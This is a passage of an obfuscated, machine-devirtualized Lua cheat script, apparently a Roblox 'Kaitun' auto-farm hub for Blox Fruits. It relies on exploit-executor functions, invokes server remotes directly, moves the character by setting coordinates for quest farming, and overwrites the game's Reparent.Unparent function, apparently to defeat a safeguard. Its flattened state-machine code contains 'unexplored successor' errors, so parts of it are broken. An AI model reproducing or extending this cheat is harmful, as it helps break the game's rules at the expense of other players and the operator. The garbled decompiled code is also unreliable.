              elseif bomayyeuvietnamKaitunRunning <= 102 then
                new7[dutDit] = new(udim2, udim22, 0.5, 0)
                new7.Size = UDim2.new(1, 47, 1, 47)
                new7.ZIndex = 0
                new7.Image = "rbxthumb://type=Asset&id=110625942841371&w=150&h=150"
                new7.ImageTransparency = 0.25
                new7.ImageColor3 = Color3.fromRGB(0, 0, 0)

                bomayyeuvietnamKaitunRunning = 145
              elseif bomayyeuvietnamKaitunRunning <= 103 then
                frame = getgenv().Configs.Quest["RGB Haki"]
                bomayyeuvietnamKaitunRunning = 34
              else
                new[divider] = CFrame.new(
                  -4957.67041, 35.949837, -4665.599609, 0.890994847, 0, -0.454013437, 0, 1, 0, 0.454013437, 0, 0.890994847
                )

                new[3] = CFrame.new(-4975.763671875, 314.5537109375, -3215.6198730469)

                cframe[dutDit] = new
                cframe.Command = { "BuyFishmanKarate" }

                bomayyeuvietnamKaitunRunning = 55
              end

              continue
            end
          elseif bomayyeuvietnamKaitunRunning <= 110 then
            if bomayyeuvietnamKaitunRunning <= 107 then
              if bomayyeuvietnamKaitunRunning <= 105 then
                divider = Instance.new("TextLabel")
                divider.Name = "SectionTitle"
                divider.Parent = dutDit
                divider.Position = UDim2.new(0, 12, 0, 10)
                divider.Size = UDim2.new(1, -24, 0, 20)

                bomayyeuvietnamKaitunRunning = 221
                divider2 = "BackgroundTransparency"
              elseif bomayyeuvietnamKaitunRunning <= 106 then
                new5.Ms = "Ship Deckhand"
                new5.Mon = "Ship Deckhand"
                new5.Quest = "ShipQuest1"
                new5.QLv = 1
                new5.Next = 1275

                new6 = CFrame.new(
                  1037.80127, 125.092171, 32911.6016, -0.244533166, 0, -0.969640911, 0, 1.00000012, 0, 0.96964103, 0, -0.244533136
                )

                bomayyeuvietnamKaitunRunning = 359
                fromRGB = "CQ"
              else
                textLabel[levelLabel] = new3
                textLabel.Quest = "SnowMountainQuest"
                textLabel.QLv = 1
                textLabel.Next = 1050

                textLabel.CQ = CFrame.new(
                  609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106
                )

                new3 = CFrame.new
                bomayyeuvietnamKaitunRunning = 362
                levelLabel = "CMon"
              end
            elseif bomayyeuvietnamKaitunRunning <= 108 then
              top[divider] = divider2(udim2, udim22, 0, 22)
              top.Text = "BOMAYYEUVIETNAM Hub"
              top.TextColor3 = val25.Text
              top.TextSize = 17
              top.TextXAlignment = Enum.TextXAlignment.Left
              top.TextYAlignment = Enum.TextYAlignment.Center

              divider = Instance.new
              bomayyeuvietnamKaitunRunning = 277
            elseif bomayyeuvietnamKaitunRunning <= 109 then
              typeAccountScroll[dutDit] = new[fromRGB2](27, 42, 53)
              typeAccountScroll.Name = "TypeAccountScroll"
              typeAccountScroll.Parent = cframe
              typeAccountScroll.Position = UDim2.new(0.55000001192093, 0, 0.34999999403954, 0)
              typeAccountScroll.Size = UDim2.new(0.40000000596046, 0, 0.34999999403954, 0)

              bomayyeuvietnamKaitunRunning = 6
              dutDit = "Selectable"
            else
              bomayyeuvietnamKaitunRunning = frame and 151 or 146
            end

            continue
          elseif bomayyeuvietnamKaitunRunning <= 113 then
            if bomayyeuvietnamKaitunRunning <= 111 then
              val57 = 5
              break
            end

            if bomayyeuvietnamKaitunRunning <= 112 then
              divider[dutDit] = UDim2.new(0.69999998807907, 0, 0, 2)
              divider.Selectable = false

              divider2.BorderColor3 = Color3.fromRGB(27, 42, 53)
              divider2.Name = "Divider"
              divider2.Parent = cframe

              new = UDim2.new
              bomayyeuvietnamKaitunRunning = 343
              dutDit = "Position"
              fromRGB2 = 0.10000000149012
              fontWeight = 0
            else
              new3[dropShadow2] = main(
                new4, new5, fromRGB, new6, cframe2, top, udim2, textLabel2, udim22, -0.822046936, -6.74401548e-8, -0.569419742
              )

              dropShadow2 = {
                Min = 1125, Max = 1174, Ms = "Horned Warrior", Mon = "Horned Warrior", Quest = "IceSideQuest", QLv = 2, Next = 1175, Fallback = "Lab Subordinate", }

              new4 = CFrame
              bomayyeuvietnamKaitunRunning = 52
              main = "CQ"
            end

            continue
          else
            if bomayyeuvietnamKaitunRunning <= 114 then
              cframe2.Ms = "Peanut Scout"
              cframe2.Mon = "Peanut Scout"
              cframe2.Quest = "NutsIslandQuest"
              cframe2.QLv = 1
              cframe2.Next = 2100

              udim2 = CFrame.new(
                -2104.17163, 38.1299706, -10194.418, 0.758814394, -1.38604395e-9, 0.651306927, 2.85280208e-8, 1, -3.1108879e-8, -0.651306927, 4.21863646e-8, 0.758814394
              )

              bomayyeuvietnamKaitunRunning = 158
              top = "CQ"
            elseif bomayyeuvietnamKaitunRunning <= 115 then
              new2[itemLabel12] = textLabel[levelLabel](
                -4882.8623, 22.6520386, 4255.53516, 0.273695946, -5.40380647e-8, -0.96181643, 4.37720793e-8, 1, -4.37274998e-8, 0.96181643, -3.01326679e-8, 0.273695946
              )

              itemLabel12 = {
                Min = 99999, Max = 99999, Ms = "Sky Bandit", Mon = "Sky Bandit", Quest = "SkyQuest", }

              bomayyeuvietnamKaitunRunning = 252
              textLabel = "QLv"
            else
              itemLabel1.Max = 1699
              itemLabel1.Ms = "Giant Islander"
              itemLabel1.Mon = "Giant Islander"
              itemLabel1.Quest = "AmazonQuest2"
              itemLabel1.QLv = 2
              itemLabel1.Next = 1700
              itemLabel1.Fallback = "Female Islander"

              itemLabel12 = CFrame.new
              bomayyeuvietnamKaitunRunning = 177
              new2 = "CQ"
              textLabel = 5448.86133
              levelLabel = 601.516174
              new3 = 751.130676
              dropShadow2 = 0
              main = 0
              new4 = 1
              new5 = 0
            end

            continue
          end
        elseif bomayyeuvietnamKaitunRunning <= 128 then
          if bomayyeuvietnamKaitunRunning <= 122 then
            if bomayyeuvietnamKaitunRunning <= 119 then
              if bomayyeuvietnamKaitunRunning <= 117 then
                new[dropShadow2] = main
                new.Size = UDim2.new(0, 320, 0, 68)
                new.ZIndex = 0

                dropShadow2 = Instance.new("ImageLabel")
                dropShadow2.Name = "DropShadow2"
                dropShadow2.Parent = new
                dropShadow2.AnchorPoint = Vector2.new(0.5, 0.5)

                new4 = Color3
                bomayyeuvietnamKaitunRunning = 230
                main = "BackgroundColor3"
              elseif bomayyeuvietnamKaitunRunning <= 118 then
                val32[frame] = cframe(dutDit, new, -1305.22)
                val32.MarineQuest2 = CFrame.new(-4688.98, 5.88, 4226.45)
                val32.SkyQuest = CFrame.new(-4742.24, 967.4, -745.69)
                val32.PrisonerQuest = CFrame.new(5201.2, 19.55, 735.93)

                bomayyeuvietnamKaitunRunning = 229
                frame = "ImpelQuest"
              else
                bomayyeuvietnamKaitunRunning = frame and 212 or 210
              end
            elseif bomayyeuvietnamKaitunRunning <= 120 then
              levelLabel[new3] = dropShadow2(
                main, new4, new5, -0.698032081, -8.28980049e-8, -0.71606636, -1.98835952e-8, 1, -9.63858184e-8, 0.71606636, -5.30424877e-8, -0.698032081
              )

              new3 = {
                Min = 1100, Max = 1124, Ms = "Lab Subordinate", Mon = "Lab Subordinate", Quest = "IceSideQuest", QLv = 1, }

              bomayyeuvietnamKaitunRunning = 28
              dropShadow2 = "Next"
              main = 1125
            elseif bomayyeuvietnamKaitunRunning <= 121 then
              cframe2.Next = 475
              cframe2.Fallback = "Fishman Commando"
              cframe2.CQ = CFrame.new(-4721.71436, 845.277161, -1954.20105)
              cframe2.CMon = CFrame.new(-4716.95703, 853.089722, -1933.925427)

              top = { Min = 475, Max = 524 }
              bomayyeuvietnamKaitunRunning = 270
              udim2 = "Ms"
            else
              function val22.PrioritizeRipIndra(ripIndraTrueForm)
                local val90 = 10
                local humanoid = nil
                local humanoidRootPart = nil
                local val91 = nil

                while true do
                  if val90 <= 13 then
                    if val90 <= 6 then
                      if val90 <= 2 then
                        if val90 <= 0 then
                          val19.Remotes.CommF_:InvokeServer("Buso")
                          val90 = 5
                        elseif val90 <= 1 then
                          val90 = val91 and 20 or 3
                        else
                          val35(humanoidRootPart.CFrame * CFrame.new(0, 30, 0), 1.5)
                          val90 = 20
                        end

                        continue
                      end

                      if val90 <= 4 then
                        if val90 <= 3 then
                          val21.wt(0.1)
                          val90 = not val21.ffc(localPlayer.Character, "HasBuso") and 0 or 5
                          continue
                        end

                        return false
                      end

                      if val90 <= 5 then
                        val35(humanoidRootPart.CFrame * CFrame.new(0, -30, 0), 1.5)
                        val36()
                        local val92 = ripIndraTrueForm.Parent ~= val18

                        if val92 then
                          val90 = 17
                          val91 = val92
                        else
                          val90 = 11
                        end
                      else
                        local fireEssence = val34("Fire Essence")

                        if fireEssence then
                          val90 = 14
                        else
                          val90 = 26
                          ripIndraTrueForm = fireEssence
                        end
                      end

                      continue
                    end

                    if val90 <= 9 then
                      if val90 <= 7 then
                        humanoid = ripIndraTrueForm:FindFirstChild("Humanoid")
                        val90 = 27
                      elseif val90 <= 8 then
                        humanoidRootPart = ripIndraTrueForm:FindFirstChild("HumanoidRootPart")
                        val90 = 15
                      else
                        ripIndraTrueForm = val19:FindFirstChild("rip_indra True Form")
                        val90 = 12
                      end
                    elseif val90 <= 11 then
                      if val90 <= 10 then
                        local val93 = not Three_World

                        if val93 then
                          val90 = 26
                          ripIndraTrueForm = val93
                        else
                          val90 = 6
                        end
                      else
                        val91 = humanoid.Health <= 0
                        val90 = 17
                      end
                    elseif val90 <= 12 then
                      if ripIndraTrueForm then
                        val90 = 7
                      else
                        val90 = 27
                        humanoid = ripIndraTrueForm
                      end
                    else
                      Quest = nil
                      val21.Status(" Status : Farm rip_indra")
                      val90 = ripIndraTrueForm.Parent == val18 and 3 or 2
                    end
                  else
                    if val90 <= 20 then
                      if val90 <= 16 then
                        if val90 <= 14 then
                          ripIndraTrueForm = not ripIndraTrueForm
                          val90 = 26
                        elseif val90 <= 15 then
                          local val94 = not humanoid

                          if val94 then
                            val90 = 23
                            val91 = val94
                          else
                            val90 = 18
                          end
                        else
                          local ripIndraTrueForm2 = val18:FindFirstChild("rip_indra True Form")

                          if ripIndraTrueForm2 then
                            val90 = 12
                            ripIndraTrueForm = ripIndraTrueForm2
                          else
                            val90 = 9
                          end
                        end
                      elseif val90 <= 18 then
                        if val90 <= 17 then
                          val90 = val91 and 1 or 19
                        else
                          val91 = not humanoidRootPart
                          val90 = 23
                        end
                      elseif val90 <= 19 then
                        val91 = not getgenv().AutoFarm
                        val90 = 1
                      else
                        val90 = 22
                        ripIndraTrueForm = true
                      end

                      continue
                    end

                    if val90 <= 23 then
                      if val90 <= 21 then
                        return false
                      end

                      if val90 <= 22 then
                        break
                      end

                      val90 = val91 and 24 or 25
                      continue
                    end

                    if val90 <= 25 then
                      if val90 <= 24 then
                        val90 = val91 and 21 or 13
                      else
                        val91 = humanoid.Health <= 0
                        val90 = 24
                      end
                    elseif val90 <= 26 then
                      val90 = ripIndraTrueForm and 4 or 16
                    elseif ripIndraTrueForm then
                      val90 = 8
                    else
                      val90 = 15
                      humanoidRootPart = ripIndraTrueForm
                    end
                  end
                end

                return ripIndraTrueForm
              end

              task.spawn(function()
                local val95 = 4

                while true do
                  if val95 <= 1 then
                    if val95 <= 0 then
                      val95 = not noFruit and 3 or 4
                    else
                      pcall(val36)
                      val95 = 4
                    end

                    continue
                  end

                  if not (val95 <= 2) then
                    if val95 <= 3 then
                      val38()
                      val95 = 1
                    else
                      val95 = val21.wt() and 0 or 2
                    end

                    continue
                  end

                  break
                end
              end)

              getgenv().AutoFarm = false
              val21.Status(" Status : Read Melee Inventory")
              val22.GetStep(true)
              getgenv().AutoFarm = true
              local threeWorld = Three_World

              if threeWorld then
                bomayyeuvietnamKaitunRunning = 279
              else
                bomayyeuvietnamKaitunRunning = 339
                frame = threeWorld
              end
            end
          elseif bomayyeuvietnamKaitunRunning <= 125 then
            if bomayyeuvietnamKaitunRunning <= 123 then
              new3[dropShadow2] = main(
                new4, new5, fromRGB, new6, cframe2, top, 1.60817859e-9, 1, -5.16744869e-9, 0.995993316, -2.06384709e-9, -0.0894274712
              )

              new3.CMon = CFrame.new(
                5433.39307, 88.678093, 514.986877, 0.879988372, 0, -0.474995494, 0, 1, 0, 0.474995494, 0, 0.879988372
              )

              dropShadow2 = { Min = 250 }
              bomayyeuvietnamKaitunRunning = 22
              main = "Max"
              new4 = 274
            elseif bomayyeuvietnamKaitunRunning <= 124 then
              dropShadow2[main] = new4(new5, fromRGB, 450, 450)

              main = Instance.new("Frame")
              main.Name = "Main"
              main.Parent = dropShadow2
              main.AnchorPoint = Vector2.new(0.5, 0.5)
              main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
              main.BackgroundTransparency = 0.5

              bomayyeuvietnamKaitunRunning = 288
            else
              udim22[under] = uiGradient(
                new7, fromRGB2, fontWeight, 0.990270376, 0, -0.13915664, 0, 1, 0, 0.13915664, 0, 0.990270376
              )

              udim22.CMon = CFrame.new(
                -3212.99683, 263.809296, -10551.8799, 0.742111444, -5.59139615e-8, -0.670276582, 1.69155214e-8, 1, -6.46908234e-8, 0.670276582, 3.66697037e-8, 0.742111444
              )

              cframe[1] = dutDit
              cframe[2] = new
              cframe[3] = divider
              cframe[4] = divider2
              cframe[5] = typeAccountScroll
              cframe[6] = itemLabel1
              cframe[7] = new2
              cframe[8] = itemLabel12
              cframe[9] = textLabel
              cframe[10] = levelLabel
              cframe[11] = new3
              cframe[12] = dropShadow2
              cframe[13] = main
              cframe[14] = new4
              cframe[15] = new5
              cframe[16] = fromRGB
              cframe[17] = new6
              cframe[18] = cframe2
              cframe[19] = top
              cframe[20] = udim2
              cframe[21] = textLabel2
              cframe[22] = udim22

              val31[frame] = cframe
              bomayyeuvietnamKaitunRunning = 44
              frame = "Three_World"
            end
          elseif bomayyeuvietnamKaitunRunning <= 126 then
            cframe:CreateUI({
              Title = "BOMAYYEUVIETNAM Hub", Subtitle = "hello ng dÃƒÂ¹ng", Backend = { BaseURL = nil, WorkerURL = nil }, })

            bomayyeuvietnamKaitunRunning = 167
          elseif bomayyeuvietnamKaitunRunning <= 127 then
            val23[frame] = cframe(-16122.41, 10.64, -257.35)
            val23["Sun-kissed Warrior"] = CFrame.new(-16357.31, 20.64, 1005.65)
            val23["Isle Champion"] = CFrame.new(-16787.32, 20.64, 992.13)
            val23["Serpent Hunter"] = CFrame.new(-16599.71, 70.59, 1757.91)

            bomayyeuvietnamKaitunRunning = 256
          else
            divider[divider2] = typeAccountScroll.TextXAlignment.Left

            local content2 = Instance.new("Frame")
            content2.Name = "Content"
            content2.Parent = dutDit
            content2.Position = UDim2.new(0, 12, 0, 39)

            divider2 = UDim2.new
            bomayyeuvietnamKaitunRunning = 131
            divider = "Size"
            typeAccountScroll = 1
            fromRGB = -24
            dutDit = content2
          end

          continue
        elseif bomayyeuvietnamKaitunRunning <= 134 then
          if bomayyeuvietnamKaitunRunning <= 131 then
            if bomayyeuvietnamKaitunRunning <= 129 then
              new5[frame] = Vector2.new(0, 0)
              new5.TextColor3 = val25.Text
              new5.TextSize = 12
              new5.TextXAlignment = Enum.TextXAlignment.Left
              new5.TextTruncate = Enum.TextTruncate.AtEnd

              frame = Instance.new("ScreenGui")
              dutDit = Instance
              bomayyeuvietnamKaitunRunning = 329
              new = "new"
              continue
            end

            val57 = 4
            break
          end

          val57 = 3
          break
        else
          val57 = 2
          break
        end
      end

      bomayyeuvietnamKaitunRunning = 130
      continue
    end

    val57 = 1
    break
  end

  if val57 ~= 1 then
    if val57 == 2 then
      error("devirt: unexplored successor 241:10498")
    end

    if val57 == 3 then
      error("devirt: unexplored successor 241:6864")
    end

    if val57 == 4 then
      if not (bomayyeuvietnamKaitunRunning <= 130) then
        error("devirt: unexplored successor 241:13868")
      end

      local val96 = fromRGB2(fontWeight)
      local val97

      while true do
        local element5 = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 206, 250)))
        udim2[1] = val96

        do
          local element6 = table.pack(table.unpack(element5, 1, element5.n))
          table.move(element6, 1, element6.n, 2, udim2)
        end

        udim22[dutDit] = new(udim2)
        udim22.Parent = textLabel2

        under.BackgroundTransparency = 0.9990000128746
        under.Name = "Under"
        under.Parent = cframe

        new = UDim2.new
        local bomayyeuvietnamKaitunRunning2 = 238
        dutDit = "Position"
        udim2 = 0.75
        udim22 = 0
        local val98 = nil

        while true do
          if bomayyeuvietnamKaitunRunning2 <= 188 then
            if bomayyeuvietnamKaitunRunning2 <= 93 then
              if bomayyeuvietnamKaitunRunning2 <= 46 then
                if bomayyeuvietnamKaitunRunning2 <= 22 then
                  if bomayyeuvietnamKaitunRunning2 <= 10 then
                    if bomayyeuvietnamKaitunRunning2 <= 4 then
                      if bomayyeuvietnamKaitunRunning2 <= 1 then
                        if bomayyeuvietnamKaitunRunning2 <= 0 then
                          local element7 = table.pack(udim22.new(1, -28, 0, 168))
                          element7.n = 3 + element7.n - 1

                          table.move(element7, 1, element7.n, 3, element7)

                          element7[1] = top
                          element7[2] = udim2

                          dutDit = dutDit(table.unpack(element7, 1, element7.n))

                          fromRGB(textLabel2, divider, "Account stats")
                          fromRGB(under, divider2, "Top weapons")

                          local content3 = Instance.new("Frame")
                          content3.Name = "Content"
                          content3.Parent = divider

                          top = UDim2.new(0, 12, 0, 39)
                          bomayyeuvietnamKaitunRunning2 = 135
                          fromRGB = "Position"
                          divider = content3
                        else
                          bomayyeuvietnamKaitunRunning2 = val19.Remotes.CommF_:InvokeServer(
                            "HornedMan", "Bet"
                          ) == 1 and 183 or 64
                        end
                      elseif bomayyeuvietnamKaitunRunning2 <= 2 then
                        new8.Ms = "Ocean Prophet"
                        new8.Mon = "Ocean Prophets"
                        new8.Quest = "SubmergedQuest2"
                        new8.QLv = 2
                        new8.Next = 2700
                        new8.Fallback = "Sea Chanter"

                        new9 = CFrame.new
                        bomayyeuvietnamKaitunRunning2 = 168
                        val49 = "CQ"
                        val50 = 10880.6855
                        val51 = -2086.20044
                        val52 = 10032.624
                        val53 = -0.321384728
                        val54 = 9.87648434e-8
                        val55 = -0.946948707
                        val56 = 7.13271007e-8
                      elseif bomayyeuvietnamKaitunRunning2 <= 3 then
                        val47[val48] = new8(
                          val49, new9, val50, val51, -9.33109447e-8, -0.355659455, 9.17655143e-8, 1, -2.12154276e-8, 0.355659455, -1.28090019e-8, 0.934615612
                        )

                        val47.CMon = CFrame.new(
                          10808.6006, -2030.36145, 9364.2334, -0.775185347, -0.0359364748, 0.6307109, 0.0615428537, 0.989336014, 0.132010356, -0.628728986, 0.141148239, -0.764707148
                        )

                        val48 = {}
                        bomayyeuvietnamKaitunRunning2 = 166
                        new8 = "Min"
                        val49 = 2650
                      else
                        require(replicatedStorage.Reparent).Unparent = function() return nil end

                        coroutine.wrap(function()
                          local val99 = 0

                          while val99 <= 0 do
                            localPlayer = tostring(game.Players.LocalPlayer.UserId):sub(2, 4)
                              .. tostring(coroutine.running()):sub(11, 15)

                            val99 = 1
                          end
                        end)()

                        localPlayer = players.LocalPlayer
                        placeId = game.PlaceId
                        frame = game
                        bomayyeuvietnamKaitunRunning2 = 192
                      end
                    elseif bomayyeuvietnamKaitunRunning2 <= 7 then
                      if bomayyeuvietnamKaitunRunning2 <= 5 then
                        textLabel[dutDit] = new[fromRGB2]

                        levelLabel.BackgroundTransparency = 1
                        levelLabel.Name = "LevelLabel"
                        levelLabel.Parent = cframe

                        levelLabel.Position = UDim2.new(
                          0.070000000298023, 0, 0.34999999403954, 0
                        )

                        levelLabel.Size = UDim2.new(0, 0, 0, 18)

                        bomayyeuvietnamKaitunRunning2 = 70
                        dutDit = "Selectable"
                        new = false
                      elseif bomayyeuvietnamKaitunRunning2 <= 6 then
                        typeAccountScroll[dutDit] = false

                        itemLabel1.BackgroundTransparency = 1
                        itemLabel1.Name = "ItemLabel1"
                        itemLabel1.Parent = typeAccountScroll
                        itemLabel1.Size = UDim2.new(1, 0, 0, 18)
                        itemLabel1.Selectable = false

                        new = Font.new
                        fontWeight = Enum.FontWeight
                        bomayyeuvietnamKaitunRunning2 = 289
                        dutDit = "FontFace"
                        fromRGB2 = "rbxasset://fonts/families/GothamSSm.json"
                        cframe3 = "Bold"
                      else
                        itemLabel1[new2] = "Snowman"
                        itemLabel1.Mon = "Snowman"
                        itemLabel1.Quest = "SnowQuest"
                        itemLabel1.QLv = 2
                        itemLabel1.Next = 120
                        itemLabel1.Fallback = "Snow Bandit"

                        itemLabel12 = CFrame.new
                        bomayyeuvietnamKaitunRunning2 = 50
                        new2 = "CQ"
                        textLabel = 1389.74451
                        levelLabel = 86.6520844
                        new3 = -1298.90796
                        dropShadow2 = -0.342042685
                        main = 0
                        new4 = 0.939684391
                        new5 = 0
                        fromRGB = 1
                        new6 = 0
                        cframe2 = -0.939684391
                        top = 0
                      end
                    elseif bomayyeuvietnamKaitunRunning2 <= 8 then
                      new2[dutDit] = new(fromRGB2, fontWeight, Enum.FontStyle.Normal)
                      new2.Text = "Item 2"
                      new2.TextColor3 = Color3.fromRGB(255, 255, 255)
                      new2.TextSize = 16

                      itemLabel12.BackgroundTransparency = 1
                      itemLabel12.Name = "ItemLabel1"
                      itemLabel12.Parent = typeAccountScroll

                      new = UDim2
                      bomayyeuvietnamKaitunRunning2 = 209
                      dutDit = "Position"
                    elseif bomayyeuvietnamKaitunRunning2 <= 9 then
                      textLabel[levelLabel] = CFrame.new(
                        -4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268
                      )

                      new3 = CFrame.new
                      bomayyeuvietnamKaitunRunning2 = 63
                      levelLabel = "CMon"
                      dropShadow2 = -5079.98096
                      main = 376.477356
                      new4 = -2194.17139
                      new5 = 0.465965867
                      fromRGB = -3.69776352e-8
                      new6 = 0.884802461
                      cframe2 = 3.40249851e-9
                      top = 1
                      udim2 = 4.00000886e-8
                      textLabel2 = -0.884802461
                      udim22 = -1.56281423e-8
                    else
                      fromRGB[new6] = cframe2(-9516.993164, 178.006515, 6078.465332)
                      fromRGB.CMon = CFrame.new(-9712.03125, 204.695892, 6193.322265)

                      new6 = {
                        Min = 2050, Max = 2074, Ms = "Posessed Mummy", Mon = "Posessed Mummy", Quest = "HauntedQuest2", }

                      bomayyeuvietnamKaitunRunning2 = 239
                      cframe2 = "QLv"
                      top = 2
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 16 then
                    if bomayyeuvietnamKaitunRunning2 <= 13 then
                      if bomayyeuvietnamKaitunRunning2 <= 11 then
                        frame.MaxSize = Vector2.new(390, 66)
                        frame.Parent = new

                        dropShadow2.Position = UDim2.new(0.5, 0, 0.5, 0)
                        dropShadow2.Size = UDim2.new(1, 32, 1, 32)
                        dropShadow2.ImageTransparency = 0.62

                        bomayyeuvietnamKaitunRunning2 = 132
                      elseif bomayyeuvietnamKaitunRunning2 <= 12 then
                        cframe2[dutDit] = new[fromRGB2]

                        top.BackgroundTransparency = 0.9990000128746
                        top.Name = "Top"
                        top.Parent = cframe
                        top.Position = UDim2.new(0.5, 0, 0.050000000745058, 0)
                        top.Size = UDim2.new(0, 0, 0, 18)

                        bomayyeuvietnamKaitunRunning2 = 364
                        dutDit = "Selectable"
                        new = false
                      else
                        new4[new5] = fromRGB(cframe2, 300, 0, 18)

                        new4.FontFace = Font.new(
                          "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
                        )

                        new4.Text = "BOMAYYEUVIETNAM Hub - Kaitun"

                        fromRGB = Color3.fromRGB
                        bomayyeuvietnamKaitunRunning2 = 225
                        new5 = "TextColor3"
                        cframe2 = 135
                        udim2 = 206
                      end
                    elseif bomayyeuvietnamKaitunRunning2 <= 14 then
                      under[uiGradient] = new7
                      under.Mon = "Galley Captain"
                      under.Quest = "FountainQuest"
                      under.QLv = 2
                      under.Next = 9999
                      under.Fallback = "Galley Pirate"

                      new7 = CFrame.new
                      bomayyeuvietnamKaitunRunning2 = 348
                      uiGradient = "CQ"
                      fromRGB2 = 5259.81982
                      fontWeight = 37.3500175
                      cframe3 = 4050.0293
                      val42 = 0.087131381
                      val43 = 0
                      val44 = 0.996196866
                      val45 = 0
                      val46 = 1
                      val47 = 0
                      val48 = -0.996196866
                      new8 = 0
                      val49 = 0.087131381
                    elseif bomayyeuvietnamKaitunRunning2 <= 15 then
                      divider[divider2] = 300
                      divider2 = { Name = "Dragon Claw", Target = 300 }
                      typeAccountScroll = { Name = "Superhuman", Target = 300 }
                      itemLabel1 = { Name = "Black Leg", Target = 400 }
                      new2 = { Name = "Death Step", BuyOnly = true }
                      itemLabel12 = {}
                      bomayyeuvietnamKaitunRunning2 = 53
                    else
                      local element8 = table.pack(fromRGB2[fontWeight](1, 0))

                      udim2[1] = udim22
                      udim2[2] = uiGradient

                      table.move(element8, 1, element8.n, 3, udim2)
                      dutDit[fromRGB] = cframe2(udim2)

                      val25 = {
                        Background = Color3.fromRGB(10, 15, 24), Surface = Color3.fromRGB(17, 25, 38), }

                      fromRGB = Color3.fromRGB
                      bomayyeuvietnamKaitunRunning2 = 220
                      dutDit = "SurfaceAlt"
                      cframe2 = 22
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 19 then
                    if bomayyeuvietnamKaitunRunning2 <= 17 then
                      dutDit.CMon = CFrame.new(
                        -737.026123, 10.1748352, 2392.57959, 0.272128761, 0, -0.962260842, 0, 1, 0, 0.962260842, 0, 0.272128761
                      )

                      new = {
                        Min = 725, Max = 774, Ms = "Mercenary", Mon = "Mercenary", }

                      bomayyeuvietnamKaitunRunning2 = 93
                      divider = "Quest"
                    elseif bomayyeuvietnamKaitunRunning2 <= 18 then
                      new[divider] = divider2.new(-7904.57373, 5584.37646, -459.62973)

                      divider = {
                        Min = 60, Max = 74, Ms = "Desert Bandit", Mon = "Desert Bandit", Quest = "DesertQuest", QLv = 1, Next = nil, }

                      typeAccountScroll = CFrame
                      bomayyeuvietnamKaitunRunning2 = 95
                      divider2 = "CQ"
                      itemLabel1 = "new"
                    else
                      bomayyeuvietnamKaitunRunning2 = dutDit and 139 or 126
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 20 then
                    val23[frame] = cframe(dutDit, new, 5955.21)
                    val23["Demonic Soul"] = CFrame.new(-9493.12, 172.17, 6149.69)
                    val23["Posessed Mummy"] = CFrame.new(-9579, 6, 6194)
                    val23["Peanut Scout"] = CFrame.new(-1948.4, 9.74, -9984.92)

                    cframe = CFrame
                    bomayyeuvietnamKaitunRunning2 = 312
                    frame = "Peanut President"
                  elseif bomayyeuvietnamKaitunRunning2 <= 21 then
                    dropShadow2[main] = new4(
                      new5, fromRGB, new6, cframe2, top, udim2, textLabel2, udim22, under, uiGradient, new7, fromRGB2
                    )

                    main = {
                      Min = 1175, Max = 1199, Ms = "Magma Ninja", Mon = "Magma Ninja", Quest = "FireSideQuest", QLv = 1, Next = 1200, }

                    new5 = CFrame.new
                    bomayyeuvietnamKaitunRunning2 = 345
                    new4 = "CQ"
                    fromRGB = -5428.03174
                    new6 = 15.0622921
                    cframe2 = -5299.43457
                    top = -0.882952213
                  else
                    dropShadow2[main] = new4
                    dropShadow2.Ms = "Toga Warrior"
                    dropShadow2.Mon = "Toga Warrior"
                    dropShadow2.Quest = "ColosseumQuest"
                    dropShadow2.QLv = 1
                    dropShadow2.Next = 275

                    new4 = CFrame.new
                    bomayyeuvietnamKaitunRunning2 = 255
                    main = "CQ"
                    new5 = -1576.11743
                    fromRGB = 7.38933945
                    new6 = -2983.30762
                    cframe2 = 0.576966345
                    top = 1.22114863e-9
                    udim2 = 0.816767931
                    textLabel2 = -3.58496594e-10
                    udim22 = 1
                    under = -1.24185606e-9
                    uiGradient = -0.816767931
                    new7 = 4.2370063e-10
                    fromRGB2 = 0.576966345
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 34 then
                  if bomayyeuvietnamKaitunRunning2 <= 28 then
                    if bomayyeuvietnamKaitunRunning2 <= 25 then
                      if bomayyeuvietnamKaitunRunning2 <= 23 then
                        local element9 = table.pack(top(udim2, udim22, uiGradient, 132))
                        element9.n = 3 + element9.n - 1

                        table.move(element9, 1, element9.n, 3, element9)

                        element9[1] = divider
                        element9[2] = divider2

                        local val100 = dutDit(table.unpack(element9, 1, element9.n))
                        local udim4 = UDim2.new(0.5, 7, 0, 62)

                        local udim22 = table.pack(UDim2.new(0.5, -21, 0, 132))
                        udim22.n = 3 + udim22.n - 1

                        table.move(udim22, 1, udim22.n, 3, udim22)

                        udim22[1] = "ItemsPanel"
                        udim22[2] = udim4

                        divider2 = dutDit(table.unpack(udim22, 1, udim22.n))
                        udim2 = UDim2.new(0, 14, 0, 208)
                        udim22 = UDim2
                        bomayyeuvietnamKaitunRunning2 = 0
                        top = "ProgressPanel"
                        divider = val100
                      elseif bomayyeuvietnamKaitunRunning2 <= 24 then
                        frame[divider2] = typeAccountScroll[dropShadow2].Sibling
                        frame.DisplayOrder = 10

                        dutDit.Name = "dut dit"
                        dutDit.Parent = frame
                        dutDit.AnchorPoint = Vector2.new(0.10000000149012, 0.10000000149012)
                        dutDit.BackgroundColor3 = val25.Primary

                        divider2 = UDim2.new(0, 20, 0.1, -6)
                        bomayyeuvietnamKaitunRunning2 = 354
                        frame = "Position"
                      else
                        new[divider] = "PiratePortQuest"
                        new.QLv = 2
                        new.Next = 1575
                        new.Fallback = "Pirate Millionaire"

                        new.CQ = CFrame.new(
                          -290.074677, 42.9034653, 5581.58984, 0.965929627, 0, -0.258804798, 0, 1, 0, 0.258804798, 0, 0.965929627
                        )

                        divider2 = CFrame
                        bomayyeuvietnamKaitunRunning2 = 328
                        divider = "CMon"
                        typeAccountScroll = "new"
                      end
                    elseif bomayyeuvietnamKaitunRunning2 <= 26 then
                      pcall(setfpscap, getgenv().Configs["FPS Limit"])
                      bomayyeuvietnamKaitunRunning2 = 235
